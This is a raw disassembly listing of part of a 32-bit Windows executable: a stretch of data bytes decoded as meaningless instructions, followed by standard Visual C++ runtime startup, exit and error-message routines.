  422538:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422539:	and    edx,DWORD PTR [ebp-0x49]
  42253c:	sub    BYTE PTR [ebp-0x51],0x95
  422540:	mov    cl,0xf0
  422542:	ins    BYTE PTR es:[edi],dx
  422543:	xchg   ecx,eax
  422544:	js     0x4225b4
  422546:	(bad)  [esi+edi*8]
  422549:	test   ah,bh
  42254b:	add    al,0xde
  42254d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42254e:	or     ebp,DWORD PTR [edx+0x78]
  422551:	mov    esi,0xa12a1c10
  422556:	pusha  
  422557:	and    dh,BYTE PTR ds:0x765d9fc
  42255d:	dec    eax
  42255e:	les    ecx,FWORD PTR [ebp+0x87ab0ad]
  422564:	push   0x20
  422566:	sti    
  422567:	push   ebx
  422568:	(bad)  
  422569:	pop    ebp
  42256a:	fs je  0x422530
  42256d:	sub    al,0x9a
  42256f:	pop    ds
  422570:	xchg   esi,eax
  422571:	add    eax,0xfba35fe6
  422576:	sbb    ah,dl
  422578:	popa   
  422579:	stos   DWORD PTR es:[edi],eax
  42257a:	mov    ebp,0x3747376e
  42257f:	test   al,0xaf
  422581:	xlat   BYTE PTR ds:[ebx]
  422582:	xchg   ecx,eax
  422583:	sti    
  422584:	es push ebp
  422586:	mov    ds:0x689a10a6,eax
  42258b:	inc    edi
  42258c:	mov    bh,0x68
  42258e:	sub    DWORD PTR [esi-0x5e],edi
  422591:	test   BYTE PTR [ebx],ch
  422593:	popa   
  422594:	push   ebx
  422595:	cmp    cl,BYTE PTR [edx+0x18c75300]
  42259b:	and    DWORD PTR [ecx-0x4188d9a7],ebx
  4225a1:	xchg   ebx,eax
  4225a2:	in     eax,0x88
  4225a4:	cmp    ecx,eax
  4225a6:	fild   WORD PTR [edx-0x6a]
  4225a9:	out    0x1d,eax
  4225ab:	stos   BYTE PTR es:[edi],al
  4225ac:	inc    eax
  4225ad:	and    ah,BYTE PTR [edx-0x83b2fb4]
  4225b3:	jo     0x4225e9
  4225b5:	retf   
  4225b6:	ds or  al,0xac
  4225b9:	jl     0x4225e4
  4225bb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4225bc:	jmp    0xf6d46f02
  4225c1:	mov    edx,DWORD PTR ds:0xac5ba67a
  4225c7:	and    DWORD PTR [ecx+0x7a],edi
  4225ca:	or     ch,ch
  4225cc:	inc    edx
  4225cd:	cli    
  4225ce:	lods   eax,DWORD PTR ss:[esi]
  4225d0:	jb     0x422611
  4225d2:	arpl   WORD PTR [edx],bp
  4225d4:	xor    ch,BYTE PTR [edi]
  4225d6:	je     0x4225a0
  4225d8:	or     BYTE PTR [ecx],bh
  4225da:	fiadd  WORD PTR [edi+0xb]
  4225dd:	pop    ecx
  4225de:	int3   
  4225df:	fcmovnu st,st(4)
  4225e1:	push   0xf6f6024a
  4225e6:	sbb    bl,al
  4225e8:	ins    DWORD PTR es:[edi],dx
  4225e9:	scas   eax,DWORD PTR es:[edi]
  4225ea:	xchg   edi,eax
  4225eb:	repnz sbb BYTE PTR [ebp+0xe],dl
  4225ef:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4225f0:	adc    eax,DWORD PTR [esi-0x4d9489d1]
  4225f6:	(bad)  
  4225f7:	pop    esp
  4225f8:	hlt    
  4225f9:	or     BYTE PTR [ebx],al
  4225fb:	cmp    BYTE PTR [ebx-0x8],ch
  4225fe:	cmp    ebp,edi
  422600:	pop    edx
  422601:	fstp   TBYTE PTR [ebp+0x2]
  422604:	jae    0x42259c
  422606:	std    
  422607:	fisttp WORD PTR ds:0xa1eed41c
  42260d:	xchg   edi,eax
  42260e:	pop    es
  42260f:	and    DWORD PTR [esi-0x16c5e1d9],edi
  422615:	loope  0x4225bf
  422617:	call   0x8d6b:0x71937c07
  42261e:	leave  
  42261f:	cmp    cl,BYTE PTR [ebx-0x16676849]
  422625:	mov    dh,ah
  422627:	pop    ss
  422628:	fcmovnu st,st(4)
  42262a:	pop    ecx
  42262b:	xor    ah,BYTE PTR [eax+0x2f927d9c]
  422631:	out    dx,al
  422632:	pushf  
  422633:	addr16 pop ss
  422635:	mov    ss,WORD PTR ds:0x674d1b81
  42263b:	inc    edx
  42263c:	(bad)  
  42263d:	mov    DWORD PTR [ebx-0x5273adf4],ecx
  422643:	sar    DWORD PTR [ebx],cl
  422645:	xchg   ebx,eax
  422646:	mov    eax,ds:0x419a5572
  42264c:	sub    DWORD PTR [ecx+0x41589d2f],edi
  422652:	push   ebx
  422653:	cmp    ebp,DWORD PTR [esi-0x7b4c1d6b]
  422659:	inc    eax
  42265a:	mov    ds:0xf65e2895,al
  42265f:	stos   DWORD PTR es:[edi],eax
  422660:	push   eax
  422661:	pop    ebx
  422662:	jecxz  0x422673
  422664:	xchg   esi,eax
  422665:	sbb    al,al
  422667:	cld    
  422668:	pop    ecx
  422669:	retf   
  42266a:	jne    0x422604
  42266c:	mov    edx,0x9453d24c
  422671:	push   ebp
  422672:	jne    0x42263f
  422674:	hlt    
  422675:	pop    es
  422676:	jle    0x422637
  422678:	pop    ds
  422679:	das    
  42267a:	shl    BYTE PTR [ecx],1
  42267c:	popf   
  42267d:	fst    DWORD PTR [ebp-0x676fa973]
  422683:	ret    
  422684:	add    DWORD PTR [ecx+0x48],0x505e6e8
  42268b:	js     0x4226c0
  42268d:	adc    al,0x88
  42268f:	test   eax,0xce2db6f
  422694:	stos   DWORD PTR es:[edi],eax
  422695:	adc    bh,dl
  422697:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422698:	fs dec esi
  42269a:	mov    ds:0x228dc312,al
  42269f:	(bad)  
  4226a0:	dec    edx
  4226a1:	int3   
  4226a2:	pushf  
  4226a3:	inc    ebx
  4226a4:	popa   
  4226a5:	dec    ecx
  4226a6:	push   esp
  4226a7:	inc    edi
  4226a8:	cmc    
  4226a9:	xchg   ebx,eax
  4226aa:	mov    ds,WORD PTR [eax]
  4226ac:	jle    0x4226df
  4226ae:	pushf  
  4226af:	mov    ds:0x4d79444d,eax
  4226b4:	xor    al,0x38
  4226b6:	fild   QWORD PTR [edi-0x50b92c4f]
  4226bc:	lock xor esp,edx
  4226bf:	mov    ah,0x12
  4226c1:	inc    esp
  4226c2:	pop    ebp
  4226c3:	xor    eax,0x23d27b49
  4226c8:	cdq    
  4226c9:	pusha  
  4226ca:	jp     0x4226c4
  4226cc:	das    
  4226cd:	xchg   BYTE PTR [edi],ah
  4226cf:	dec    edi
  4226d0:	dec    ebx
  4226d1:	scas   eax,DWORD PTR es:[edi]
  4226d2:	rcl    DWORD PTR [edx-0x61427b6d],cl
  4226d8:	and    ecx,DWORD PTR [esi+0x3b]
  4226db:	inc    ebp
  4226dc:	add    eax,0x41dbfd84
  4226e1:	loop   0x422761
  4226e3:	(bad)  
  4226e4:	es jae 0x4226e7
  4226e7:	nop
  4226e8:	dec    eax
  4226e9:	mov    al,0x71
  4226eb:	mov    dl,0x11
  4226ed:	stos   DWORD PTR es:[edi],eax
  4226ee:	add    ecx,edi
  4226f0:	hlt    
  4226f1:	std    
  4226f2:	mov    esi,0x3be232b5
  4226f7:	push   0xffffffef
  4226f9:	or     edi,DWORD PTR [esi+0x7aebf1bd]
  4226ff:	call   0xcad4:0x45773580
  422706:	jns    0x4226cc
  422708:	jne    0x42272a
  42270a:	xor    DWORD PTR [esi+edx*1],ebx
  42270d:	rol    BYTE PTR [esi-0xf],0x30
  422711:	test   al,0x38
  422713:	mov    ch,0x5e
  422715:	adc    edi,esi
  422717:	daa    
  422718:	imul   esi,DWORD PTR es:[ebx-0x252630ac],0x32
  422720:	mov    dl,0xa0
  422722:	xchg   edx,eax
  422723:	jnp    0x4226e1
  422725:	clc    
  422726:	fild   WORD PTR [edx]
  422728:	mov    ebx,0xd73502b2
  42272d:	inc    ecx
  42272e:	scas   al,BYTE PTR es:[edi]
  42272f:	push   es
  422730:	jg     0x4226ea
  422732:	mov    cl,0x4b
  422734:	adc    eax,0x9fd6b37
  422739:	mov    cl,0x18
  42273b:	out    dx,ax
  42273d:	popf   
  42273e:	cmp    al,0xb0
  422740:	add    eax,0xd8099eb7
  422745:	(bad)  
  422746:	push   0x2d27805b
  42274b:	mov    esi,0xd7f0f6a7
  422750:	gs adc al,0x60
  422753:	add    ebp,DWORD PTR [esi+0x6133093e]
  422759:	fldcw  WORD PTR [ebx-0x32]
  42275c:	pop    edi
  42275d:	out    dx,eax
  42275e:	dec    edi
  42275f:	mov    gs,esp
  422761:	pop    ebx
  422762:	push   esp
  422764:	and    BYTE PTR [eax+0x72],bl
  422767:	retf   
  422768:	lock xchg esi,eax
  42276a:	out    dx,al
  42276b:	mov    ebx,ebp
  42276d:	imul   ecx,DWORD PTR [ebx+eiz*1-0x56b75a93],0xffffff8b
  422775:	dec    esi
  422776:	(bad)  
  422777:	pop    edi
  422778:	hlt    
  422779:	push   0xffffffe8
  42277b:	mov    esi,0x31ef71b1
  422780:	cmp    al,0x3d
  422782:	dec    esi
  422783:	fwait
  422784:	xor    eax,0x2e2467ef
  422789:	pop    esp
  42278a:	ins    DWORD PTR es:[edi],dx
  42278b:	out    dx,eax
  42278c:	pop    edx
  42278d:	cli    
  42278e:	shl    esp,0xb0
  422791:	das    
  422792:	dec    ecx
  422793:	sub    ch,BYTE PTR [esi+0x77]
  422796:	ss push esp
  422798:	add    al,0x37
  42279a:	push   cs
  42279b:	shl    ecx,1
  42279d:	mov    esi,edx
  42279f:	sbb    eax,0x492a8a0
  4227a4:	or     eax,0x5440e07a
  4227a9:	ficom  DWORD PTR [ecx-0x4103afe1]
  4227af:	div    DWORD PTR [edi+eax*4+0x2d]
  4227b3:	or     DWORD PTR [ecx+0x34],edi
  4227b6:	shl    DWORD PTR [edx+0x31ce5c1a],1
  4227bc:	xchg   ebp,eax
  4227bd:	mov    DWORD PTR [ebx-0x28],ecx
  4227c0:	into   
  4227c1:	sbb    al,0x1b
  4227c3:	dec    edx
  4227c4:	bnd jns 0x422800
  4227c7:	gs aam 0xd2
  4227ca:	cmp    cl,BYTE PTR [ebp-0x150a7cf2]
  4227d0:	hlt    
  4227d1:	leave  
  4227d2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4227d3:	dec    esp
  4227d4:	das    
  4227d5:	(bad)  
  4227d6:	cdq    
  4227d7:	xor    BYTE PTR [esp],bl
  4227da:	xor    BYTE PTR [ebx],ch
  4227dc:	repnz (bad) 
  4227de:	sbb    al,0xf5
  4227e0:	xor    ah,BYTE PTR [esi-0x6c]
  4227e3:	dec    edi
  4227e4:	lods   eax,DWORD PTR ds:[esi]
  4227e5:	mov    esi,0xc35c3c9d
  4227ea:	push   es
  4227eb:	inc    esi
  4227ec:	xchg   esp,eax
  4227ed:	lock fst st(3)
  4227f0:	lods   al,BYTE PTR ds:[esi]
  4227f1:	inc    eax
  4227f2:	dec    edx
  4227f3:	mov    ss,WORD PTR [eax-0x467d4d88]
  4227f9:	add    DWORD PTR [edi-0x16c6b5f6],esi
  4227ff:	or     eax,0x4679c6a4
  422804:	mov    al,0xea
  422807:	inc    ebp
  422808:	aaa    
  422809:	pop    ebx
  42280a:	dec    ebp
  42280b:	test   eax,0xe9ea62c7
  422810:	ins    BYTE PTR es:[edi],dx
  422811:	dec    esi
  422812:	dec    esp
  422813:	cmp    ch,BYTE PTR [ebp+eiz*8+0x35f8af2c]
  42281a:	mov    cl,0xc1
  42281c:	loop   0x422861
  42281e:	inc    edi
  42281f:	jge    0x4227d3
  422821:	inc    esp
  422822:	pusha  
  422823:	clc    
  422824:	sbb    ebx,esi
  422826:	or     dh,BYTE PTR [ecx-0x36]
  422829:	in     al,dx
  42282a:	imul   eax,DWORD PTR [eax-0x42],0x9cf782fe
  422831:	ds pop ebx
  422833:	jo     0x42284f
  422835:	popa   
  422836:	push   0x56
  422838:	cmp    BYTE PTR [edi+0x6005ac76],dl
  42283e:	pushf  
  42283f:	sbb    DWORD PTR [eax],edx
  422841:	xchg   ebp,eax
  422842:	xchg   ecx,eax
  422843:	mov    DWORD PTR [ebx+ebx*4+0x74],esi
  422847:	sar    DWORD PTR [esi-0x5c],0x33
  42284b:	push   cs
  42284c:	stc    
  42284d:	dec    esp
  42284e:	mul    BYTE PTR [edx+0x3a]
  422851:	ret    0xd349
  422854:	dec    ebp
  422855:	cwde   
  422856:	xchg   ebp,eax
  422857:	(bad)  [eax+0x2f]
  42285a:	sbb    eax,0x5fad8d9c
  42285f:	mov    ecx,0x22afa9eb
  422864:	dec    edx
  422865:	popf   
  422866:	aad    0x22
  422868:	mov    ah,0x0
  42286a:	shl    DWORD PTR [ebx],cl
  42286c:	mov    dh,0x8f
  42286e:	cwde   
  42286f:	jne    0x4228a0
  422871:	retf   0xc385
  422874:	jbe    0x4227fb
  422876:	lods   eax,DWORD PTR ds:[esi]
  422877:	jecxz  0x4228f5
  422879:	sahf   
  42287a:	cmp    ecx,esi
  42287c:	xchg   edi,eax
  42287d:	popf   
  42287e:	retf   0xc4a6
  422881:	fimul  WORD PTR [ebx+eax*2-0x28]
  422885:	popa   
  422886:	aas    
  422887:	mov    bh,0x4f
  422889:	or     BYTE PTR [edi+0x25],dh
  42288c:	pop    edx
  42288d:	pop    ebp
  42288e:	dec    edx
  42288f:	inc    ebx
  422890:	mov    ebp,0x73e10cd3
  422895:	retf   0x15dc
  422898:	inc    edi
  422899:	and    eax,0xbc6accc7
  42289e:	xor    al,0x73
  4228a0:	and    DWORD PTR [ebx],esi
  4228a2:	add    al,0x10
  4228a4:	retf   0x2e95
  4228a7:	jnp    0x4228eb
  4228a9:	mov    edi,0xce7a29de
  4228ae:	call   0x243d:0xf9db9c0c
  4228b5:	pop    eax
  4228b6:	cmp    edx,DWORD PTR [ebx-0x7317274e]
  4228bc:	ror    bh,1
  4228be:	sub    BYTE PTR [eax+0x6cd29100],ch
  4228c4:	mov    dl,0xe1
  4228c6:	pop    eax
  4228c7:	sub    al,0xe3
  4228c9:	and    al,0x3f
  4228cb:	push   DWORD PTR [ecx-0x61]
  4228ce:	inc    ecx
  4228cf:	inc    ecx
  4228d0:	sub    edx,ecx
  4228d2:	popa   
  4228d3:	(bad)  
  4228d4:	test   eax,0x36b767f2
  4228d9:	or     eax,0x48025299
  4228de:	popf   
  4228df:	imul   BYTE PTR [edx+0x56a726d7]
  4228e5:	pop    ebp
  4228e6:	add    ecx,DWORD PTR [ecx]
  4228e8:	inc    edx
  4228e9:	ficomp DWORD PTR [esi]
  4228eb:	mov    bl,0x13
  4228ed:	jmp    0xcdf6a665
  4228f2:	push   eax
  4228f3:	push   cs
  4228f4:	sub    ah,BYTE PTR [ebx-0x1]
  4228f7:	or     ch,dh
  4228f9:	sub    ecx,esp
  4228fb:	pop    eax
  4228fc:	fs fs push ebp
  4228ff:	push   eax
  422900:	xchg   ebp,eax
  422901:	jge    0x42290a
  422903:	push   0x6d
  422905:	test   al,0x8a
  422907:	test   DWORD PTR [ebp+esi*1+0x1193037f],ebx
  42290e:	ret    0x6fd0
  422911:	or     eax,0x335e1b23
  422916:	ror    BYTE PTR [ebx+0x10c25de5],0x0
  42291d:	nop
  42291e:	nop
  42291f:	nop
  422920:	cmp    DWORD PTR ds:0x45cabc,0x1
  422927:	jne    0x42292e
  422929:	call   0x422e6c
  42292e:	push   DWORD PTR [esp+0x4]
  422932:	call   0x422cf5
  422937:	push   0xff
  42293c:	call   DWORD PTR ds:0x45c1c0
  422942:	pop    ecx
  422943:	pop    ecx
  422944:	ret    
  422945:	cmp    DWORD PTR ds:0x45cabc,0x1
  42294c:	jne    0x422953
  42294e:	call   0x422e6c
  422953:	push   DWORD PTR [esp+0x4]
  422957:	call   0x422cf5
  42295c:	push   0xff
  422961:	call   0x422b3b
  422966:	pop    ecx
  422967:	pop    ecx
  422968:	ret    
  422969:	push   0x60
  42296b:	push   0x428110
  422970:	call   0x423858
  422975:	mov    edi,0x94
  42297a:	mov    eax,edi
  42297c:	call   0x4238b0
  422981:	mov    DWORD PTR [ebp-0x18],esp
  422984:	mov    esi,esp
  422986:	mov    DWORD PTR [esi],edi
  422988:	push   esi
  422989:	call   DWORD PTR ds:0x428024
  42298f:	mov    ecx,DWORD PTR [esi+0x10]
  422992:	mov    DWORD PTR ds:0x45cac4,ecx
  422998:	mov    eax,DWORD PTR [esi+0x4]
  42299b:	mov    ds:0x45cad0,eax
  4229a0:	mov    edx,DWORD PTR [esi+0x8]
  4229a3:	mov    DWORD PTR ds:0x45cad4,edx
  4229a9:	mov    esi,DWORD PTR [esi+0xc]
  4229ac:	and    esi,0x7fff
  4229b2:	mov    DWORD PTR ds:0x45cac8,esi
  4229b8:	cmp    ecx,0x2
  4229bb:	je     0x4229c9
  4229bd:	or     esi,0x8000
  4229c3:	mov    DWORD PTR ds:0x45cac8,esi
  4229c9:	shl    eax,0x8
  4229cc:	add    eax,edx
  4229ce:	mov    ds:0x45cacc,eax
  4229d3:	xor    esi,esi
  4229d5:	push   esi
  4229d6:	mov    edi,DWORD PTR ds:0x428014
  4229dc:	call   edi
  4229de:	cmp    WORD PTR [eax],0x5a4d
  4229e3:	jne    0x422a04
  4229e5:	mov    ecx,DWORD PTR [eax+0x3c]
  4229e8:	add    ecx,eax
  4229ea:	cmp    DWORD PTR [ecx],0x4550
  4229f0:	jne    0x422a04
  4229f2:	movzx  eax,WORD PTR [ecx+0x18]
  4229f6:	cmp    eax,0x10b
  4229fb:	je     0x422a1c
  4229fd:	cmp    eax,0x20b
  422a02:	je     0x422a09
  422a04:	mov    DWORD PTR [ebp-0x1c],esi
  422a07:	jmp    0x422a30
  422a09:	cmp    DWORD PTR [ecx+0x84],0xe
  422a10:	jbe    0x422a04
  422a12:	xor    eax,eax
  422a14:	cmp    DWORD PTR [ecx+0xf8],esi
  422a1a:	jmp    0x422a2a
  422a1c:	cmp    DWORD PTR [ecx+0x74],0xe
  422a20:	jbe    0x422a04
  422a22:	xor    eax,eax
  422a24:	cmp    DWORD PTR [ecx+0xe8],esi
  422a2a:	setne  al
  422a2d:	mov    DWORD PTR [ebp-0x1c],eax
  422a30:	push   0x1
  422a32:	call   0x423807
  422a37:	pop    ecx
  422a38:	test   eax,eax
  422a3a:	jne    0x422a44
  422a3c:	push   0x1c
  422a3e:	call   0x422945
  422a43:	pop    ecx
  422a44:	call   0x42377e
  422a49:	test   eax,eax
  422a4b:	jne    0x422a55
  422a4d:	push   0x10
  422a4f:	call   0x422945
  422a54:	pop    ecx
  422a55:	call   0x423667
  422a5a:	mov    DWORD PTR [ebp-0x4],esi
  422a5d:	call   0x423469
  422a62:	test   eax,eax
  422a64:	jge    0x422a6e
  422a66:	push   0x1b
  422a68:	call   0x422920
  422a6d:	pop    ecx
  422a6e:	call   DWORD PTR ds:0x428020
  422a74:	mov    ds:0x45d274,eax
  422a79:	call   0x423347
  422a7e:	mov    ds:0x45cab4,eax
  422a83:	call   0x4232a5
  422a88:	test   eax,eax
  422a8a:	jge    0x422a94
  422a8c:	push   0x8
  422a8e:	call   0x422920
  422a93:	pop    ecx
  422a94:	call   0x423072
  422a99:	test   eax,eax
  422a9b:	jge    0x422aa5
  422a9d:	push   0x9
  422a9f:	call   0x422920
  422aa4:	pop    ecx
  422aa5:	call   0x422b7d
  422aaa:	mov    DWORD PTR [ebp-0x20],eax
  422aad:	cmp    eax,esi
  422aaf:	je     0x422ab8
  422ab1:	push   eax
  422ab2:	call   0x422920
  422ab7:	pop    ecx
  422ab8:	mov    DWORD PTR [ebp-0x38],esi
  422abb:	lea    eax,[ebp-0x64]
  422abe:	push   eax
  422abf:	call   DWORD PTR ds:0x42801c
  422ac5:	call   0x423009
  422aca:	mov    DWORD PTR [ebp-0x68],eax
  422acd:	test   BYTE PTR [ebp-0x38],0x1
  422ad1:	je     0x422ad9
  422ad3:	movzx  eax,WORD PTR [ebp-0x34]
  422ad7:	jmp    0x422adc
  422ad9:	push   0xa
  422adb:	pop    eax
  422adc:	push   eax
  422add:	push   DWORD PTR [ebp-0x68]
  422ae0:	push   esi
  422ae1:	push   esi
  422ae2:	call   edi
  422ae4:	push   eax
  422ae5:	call   0x421790
  422aea:	mov    edi,eax
  422aec:	mov    DWORD PTR [ebp-0x6c],edi
  422aef:	cmp    DWORD PTR [ebp-0x1c],esi
  422af2:	jne    0x422afa
  422af4:	push   edi
  422af5:	call   0x422cb5
  422afa:	call   0x422cd7
  422aff:	jmp    0x422b2c
  422b01:	mov    eax,DWORD PTR [ebp-0x14]
  422b04:	mov    ecx,DWORD PTR [eax]
  422b06:	mov    ecx,DWORD PTR [ecx]
  422b08:	mov    DWORD PTR [ebp-0x70],ecx
  422b0b:	push   eax
  422b0c:	push   ecx
  422b0d:	call   0x422ea5
  422b12:	pop    ecx
  422b13:	pop    ecx
  422b14:	ret    
  422b15:	mov    esp,DWORD PTR [ebp-0x18]
  422b18:	mov    edi,DWORD PTR [ebp-0x70]
  422b1b:	cmp    DWORD PTR [ebp-0x1c],0x0
  422b1f:	jne    0x422b27
  422b21:	push   edi
  422b22:	call   0x422cc6
  422b27:	call   0x422ce6
  422b2c:	or     DWORD PTR [ebp-0x4],0xffffffff
  422b30:	mov    eax,edi
  422b32:	lea    esp,[ebp-0x7c]
  422b35:	call   0x423893
  422b3a:	ret    
  422b3b:	push   0x42812c
  422b40:	call   DWORD PTR ds:0x428014
  422b46:	test   eax,eax
  422b48:	je     0x422b60
  422b4a:	push   0x42811c
  422b4f:	push   eax
  422b50:	call   DWORD PTR ds:0x428018
  422b56:	test   eax,eax
  422b58:	je     0x422b60
  422b5a:	push   DWORD PTR [esp+0x4]
  422b5e:	call   eax
  422b60:	push   DWORD PTR [esp+0x4]
  422b64:	call   DWORD PTR ds:0x428028
  422b6a:	int3   
  422b6b:	push   0x8
  422b6d:	call   0x423a1f
  422b72:	pop    ecx
  422b73:	ret    
  422b74:	push   0x8
  422b76:	call   0x42398b
  422b7b:	pop    ecx
  422b7c:	ret    
  422b7d:	mov    eax,ds:0x45d270
  422b82:	test   eax,eax
  422b84:	je     0x422b88
  422b86:	call   eax
  422b88:	push   esi
  422b89:	push   edi
  422b8a:	mov    ecx,0x42a00c
  422b8f:	mov    edi,0x42a018
  422b94:	xor    eax,eax
  422b96:	cmp    ecx,edi
  422b98:	mov    esi,ecx
  422b9a:	jae    0x422bb3
  422b9c:	test   eax,eax
  422b9e:	jne    0x422bdf
  422ba0:	mov    ecx,DWORD PTR [esi]
  422ba2:	test   ecx,ecx
  422ba4:	je     0x422ba8
  422ba6:	call   ecx
  422ba8:	add    esi,0x4
  422bab:	cmp    esi,edi
  422bad:	jb     0x422b9c
  422baf:	test   eax,eax
  422bb1:	jne    0x422bdf
  422bb3:	push   0x4236ab
  422bb8:	call   0x423b30
  422bbd:	mov    esi,0x42a000
  422bc2:	mov    eax,esi
  422bc4:	mov    edi,0x42a008
  422bc9:	cmp    eax,edi
  422bcb:	pop    ecx
  422bcc:	jae    0x422bdd
  422bce:	mov    eax,DWORD PTR [esi]
  422bd0:	test   eax,eax
  422bd2:	je     0x422bd6
  422bd4:	call   eax
  422bd6:	add    esi,0x4
  422bd9:	cmp    esi,edi
  422bdb:	jb     0x422bce
  422bdd:	xor    eax,eax
  422bdf:	pop    edi
  422be0:	pop    esi
  422be1:	ret    
  422be2:	push   ebp
  422be3:	mov    ebp,esp
  422be5:	push   esi
  422be6:	push   edi
  422be7:	push   0x8
  422be9:	call   0x423a1f
  422bee:	xor    esi,esi
  422bf0:	inc    esi
  422bf1:	cmp    DWORD PTR ds:0x45cb04,esi
  422bf7:	pop    ecx
  422bf8:	jne    0x422c0a
  422bfa:	push   DWORD PTR [ebp+0x8]
  422bfd:	call   DWORD PTR ds:0x428030
  422c03:	push   eax
  422c04:	call   DWORD PTR ds:0x42802c
  422c0a:	cmp    DWORD PTR [ebp+0xc],0x0
  422c0e:	mov    al,BYTE PTR [ebp+0x10]
  422c11:	mov    DWORD PTR ds:0x45cb00,esi
  422c17:	mov    ds:0x45cafc,al
  422c1c:	jne    0x422c70
  422c1e:	mov    ecx,DWORD PTR ds:0x45d268
  422c24:	test   ecx,ecx
  422c26:	je     0x422c51
  422c28:	mov    eax,ds:0x45d264
  422c2d:	sub    eax,0x4
  422c30:	cmp    eax,ecx
  422c32:	jmp    0x422c4a
  422c34:	mov    eax,DWORD PTR [eax]
  422c36:	test   eax,eax
  422c38:	je     0x422c3c
  422c3a:	call   eax
  422c3c:	mov    eax,ds:0x45d264
  422c41:	sub    eax,0x4
  422c44:	cmp    eax,DWORD PTR ds:0x45d268
  422c4a:	mov    ds:0x45d264,eax
  422c4f:	jae    0x422c34
  422c51:	mov    eax,0x42a01c
  422c56:	mov    esi,0x42a020
  422c5b:	cmp    eax,esi
  422c5d:	mov    edi,eax
  422c5f:	jae    0x422c70
  422c61:	mov    eax,DWORD PTR [edi]
  422c63:	test   eax,eax
  422c65:	je     0x422c69
  422c67:	call   eax
  422c69:	add    edi,0x4
  422c6c:	cmp    edi,esi
  422c6e:	jb     0x422c61
  422c70:	mov    eax,0x42a024
  422c75:	mov    esi,0x42a028
  422c7a:	cmp    eax,esi
  422c7c:	mov    edi,eax
  422c7e:	jae    0x422c8f
  422c80:	mov    eax,DWORD PTR [edi]
  422c82:	test   eax,eax
  422c84:	je     0x422c88
  422c86:	call   eax
  422c88:	add    edi,0x4
  422c8b:	cmp    edi,esi
  422c8d:	jb     0x422c80
  422c8f:	cmp    DWORD PTR [ebp+0x10],0x0
  422c93:	pop    edi
  422c94:	pop    esi
  422c95:	je     0x422ca0
  422c97:	push   0x8
  422c99:	call   0x42398b
  422c9e:	jmp    0x422cb2
  422ca0:	push   DWORD PTR [ebp+0x8]
  422ca3:	mov    DWORD PTR ds:0x45cb04,0x1
  422cad:	call   0x422b3b
  422cb2:	pop    ecx
  422cb3:	pop    ebp
  422cb4:	ret    
  422cb5:	push   0x0
  422cb7:	push   0x0
  422cb9:	push   DWORD PTR [esp+0xc]
  422cbd:	call   0x422be2
  422cc2:	add    esp,0xc
  422cc5:	ret    
  422cc6:	push   0x0
  422cc8:	push   0x1
  422cca:	push   DWORD PTR [esp+0xc]
  422cce:	call   0x422be2
  422cd3:	add    esp,0xc
  422cd6:	ret    
  422cd7:	push   0x1
  422cd9:	push   0x0
  422cdb:	push   0x0
  422cdd:	call   0x422be2
  422ce2:	add    esp,0xc
  422ce5:	ret    
  422ce6:	push   0x1
  422ce8:	push   0x1
  422cea:	push   0x0
  422cec:	call   0x422be2
  422cf1:	add    esp,0xc
  422cf4:	ret    
  422cf5:	push   ebp
  422cf6:	mov    ebp,esp
  422cf8:	sub    esp,0x10c
  422cfe:	mov    eax,ds:0x45c430
  422d03:	xor    eax,DWORD PTR [ebp+0x4]
  422d06:	mov    ecx,DWORD PTR [ebp+0x8]
  422d09:	push   ebx
  422d0a:	push   esi
  422d0b:	mov    DWORD PTR [ebp-0x4],eax
  422d0e:	xor    edx,edx
  422d10:	push   edi
  422d11:	xor    eax,eax
  422d13:	cmp    ecx,DWORD PTR [eax*8+0x45c1c8]
  422d1a:	je     0x422d22
  422d1c:	inc    eax
  422d1d:	cmp    eax,0x12
  422d20:	jb     0x422d13
  422d22:	mov    esi,eax
  422d24:	shl    esi,0x3
  422d27:	cmp    ecx,DWORD PTR [esi+0x45c1c8]
  422d2d:	jne    0x422e56
  422d33:	mov    eax,ds:0x45cabc
  422d38:	cmp    eax,0x1
  422d3b:	je     0x422e31
  422d41:	cmp    eax,edx
  422d43:	jne    0x422d52
  422d45:	cmp    DWORD PTR ds:0x45c1c4,0x1
  422d4c:	je     0x422e31
  422d52:	cmp    ecx,0xfc
  422d58:	je     0x422e56
  422d5e:	push   0x104
  422d63:	lea    eax,[ebp-0x10c]
  422d69:	push   eax
  422d6a:	push   edx
  422d6b:	mov    BYTE PTR [ebp-0x8],dl
  422d6e:	call   DWORD PTR ds:0x42803c
  422d74:	test   eax,eax
  422d76:	jne    0x422d8b
  422d78:	lea    eax,[ebp-0x10c]
  422d7e:	push   0x428484
  422d83:	push   eax
  422d84:	call   0x423c40
  422d89:	pop    ecx
  422d8a:	pop    ecx
  422d8b:	lea    eax,[ebp-0x10c]
  422d91:	push   eax
  422d92:	lea    edi,[ebp-0x10c]
  422d98:	call   0x423e70
  422d9d:	inc    eax
  422d9e:	cmp    eax,0x3c
  422da1:	pop    ecx
  422da2:	jbe    0x422dcd
  422da4:	lea    eax,[ebp-0x10c]
  422daa:	push   eax
  422dab:	call   0x423e70
  422db0:	mov    edi,eax
  422db2:	lea    eax,[ebp-0x10c]
  422db8:	sub    eax,0x3b
  422dbb:	push   0x3
  422dbd:	add    edi,eax
  422dbf:	push   0x428480
  422dc4:	push   edi
  422dc5:	call   0x423d40
  422dca:	add    esp,0x10
  422dcd:	push   edi
  422dce:	call   0x423e70
  422dd3:	push   DWORD PTR [esi+0x45c1cc]
  422dd9:	mov    ebx,eax
  422ddb:	call   0x423e70
  422de0:	lea    eax,[ebx+eax*1+0x1c]
  422de4:	pop    ecx
  422de5:	add    eax,0x3
  422de8:	pop    ecx
  422de9:	and    eax,0xfffffffc
  422dec:	call   0x4238b0
  422df1:	mov    ebx,esp
  422df3:	push   0x428464
  422df8:	push   ebx
  422df9:	call   0x423c40
  422dfe:	push   edi
  422dff:	push   ebx
  422e00:	call   0x423c50
  422e05:	push   0x428460
  422e0a:	push   ebx
  422e0b:	call   0x423c50
  422e10:	push   DWORD PTR [esi+0x45c1cc]
  422e16:	push   ebx
  422e17:	call   0x423c50
  422e1c:	push   0x12010
  422e21:	push   0x428438
  422e26:	push   ebx
  422e27:	call   0x423b42
  422e2c:	add    esp,0x2c
  422e2f:	jmp    0x422e56
  422e31:	push   edx
  422e32:	lea    eax,[ebp+0x8]
